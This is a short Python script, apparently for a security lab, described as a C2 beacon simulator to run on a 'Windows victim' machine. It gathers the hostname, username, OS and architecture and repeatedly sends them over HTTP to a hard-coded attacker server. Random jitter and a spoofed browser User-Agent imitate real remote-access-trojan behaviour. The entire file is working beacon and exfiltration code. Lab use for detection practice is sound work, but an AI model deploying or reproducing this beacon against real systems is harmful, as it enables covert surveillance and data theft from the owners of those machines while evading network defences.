#!/usr/bin/env python3
"""
C2 Beacon Simulator — run on the Windows victim machine.
Sends periodic HTTP check-ins to the attacker's server.
Benign: only transmits system info, causes no harm.

Usage: python3 tools/beacon.py
       (copy to Windows victim and run with Python 3)
"""

import platform, socket, time, urllib.request, urllib.parse, os, random, datetime

C2   = "192.168.11.149"
PORT = 8080
INTERVAL = 10   # seconds between beacons
JITTER   = 0.3  # ±30% randomisation (mimics real RAT behaviour)

info = {
    "host": socket.gethostname(),
    "user": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
    "os":   platform.system() + " " + platform.release(),
    "arch": platform.machine(),
}

print(f"C2 beacon → {C2}:{PORT}  interval={INTERVAL}s ±{int(JITTER*100)}%")
print(f"Host: {info['host']}  User: {info['user']}  OS: {info['os']}")
print("Ctrl+C to stop\n")

count = 0
while True:
    count += 1
    qs  = urllib.parse.urlencode({**info, "n": count})
    url = f"http://{C2}:{PORT}/beacon?{qs}"
    try:
        req = urllib.request.Request(url,
              headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        urllib.request.urlopen(req, timeout=5)
        print(f"  [{datetime.datetime.now().strftime('%H:%M:%S')}] beacon #{count} sent")
    except Exception as e:
        print(f"  [{datetime.datetime.now().strftime('%H:%M:%S')}] beacon #{count} failed: {e}")

    sleep = INTERVAL * (1 + random.uniform(-JITTER, JITTER))
    time.sleep(sleep)
